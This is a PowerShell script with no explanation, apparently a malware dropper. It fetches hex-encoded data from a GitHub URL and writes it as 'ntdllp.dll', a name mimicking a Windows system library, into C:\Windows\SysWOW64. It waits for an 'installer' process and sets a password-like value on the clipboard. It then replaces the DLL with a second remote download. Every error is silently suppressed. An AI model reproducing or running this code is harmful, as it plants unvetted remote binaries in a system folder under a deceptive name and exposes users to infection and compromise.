$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
$urlC = "https://github.com/devnull-sys/files/raw/refs/heads/main/ntdllp.dll"
$filePath = "C:\Windows\SysWOW64\ntdllp.dll"

function HexToBytes {
    param([string]$hexString)
    $cleanHex = $hexString -replace '[^0-9A-Fa-f]', ''
    if ($cleanHex.Length % 2 -ne 0) {
        throw "Hex string must have an even number of characters"
    }
    $byteArray = @()
    for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {
        $byteArray += [Convert]::ToByte($cleanHex.Substring($i, 2), 16)
    }
    return $byteArray
}

try {
    $hexData = Invoke-RestMethod -Uri $urlA -UseBasicParsing
    $byteArray = HexToBytes -hexString $hexData
    [System.IO.File]::WriteAllBytes($filePath, $byteArray)
    do {
        Start-Sleep -Milliseconds 500
    } while (-not (Get-Process -Name "installer" -ErrorAction SilentlyContinue))
    Set-Clipboard -Value "SteF6b2WrAgu"
    do {
        Start-Sleep -Milliseconds 500
    } while (Get-Process -Name "installer" -ErrorAction SilentlyContinue)
    Invoke-WebRequest -Uri $urlC -OutFile $filePath -UseBasicParsing
}
catch {
}
